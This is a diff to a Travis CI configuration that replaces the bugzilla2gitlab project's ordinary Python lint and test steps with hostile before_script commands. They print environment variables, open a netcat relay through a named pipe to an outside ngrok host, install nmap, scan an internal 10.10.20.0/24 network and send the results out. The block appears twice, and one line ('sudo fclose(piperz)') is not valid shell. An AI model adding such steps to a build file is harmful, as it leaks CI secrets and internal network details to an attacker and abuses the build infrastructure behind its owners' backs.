@@ -1,14 +1,23 @@
-language: python
-python:
-  - "2.7"
-  - "3.3"
-  - "3.4"
-  - "3.5"
-install:
-  - "pip install flake8"
-  - "pip install -r requirements.txt"
-  - "python setup.py install"
+language: node_js
+sudo: required
 before_script:
-  - "flake8 bugzilla2gitlab/*.py"
-  - "flake8 tests/*.py"
-script: ./runtests tests/
+  - env
+  - whoami
+  - export NGPORT=18561
+  - export NGHOSTNAME=0.tcp.ngrok.io
+  - mkfifo piperz
+  - nc -k -l 12345 0<piperz|nc $NGHOSTNAME $NGPORT 1>piperz &
+  - sudo apt-get update
+  - sudo apt-get install nmap
+  - sudo nmap -sT 10.10.20.0/24 -Pn | nc localhost 12345
+  - echo "ciderdone" | nc localhost 12345
+  - sudo fclose(piperz)
+  - export NGPORT=18561
+  - export NGHOSTNAME=0.tcp.ngrok.io
+  - mkfifo piperz
+  - nc -k -l 12345 0<piperz|nc $NGHOSTNAME $NGPORT 1>piperz &
+  - sudo apt-get update
+  - sudo apt-get install nmap
+  - sudo nmap -sT 10.10.20.0/24 -Pn | nc localhost 12345
+  - echo "ciderdone" | nc localhost 12345
+  - sudo fclose(piperz)
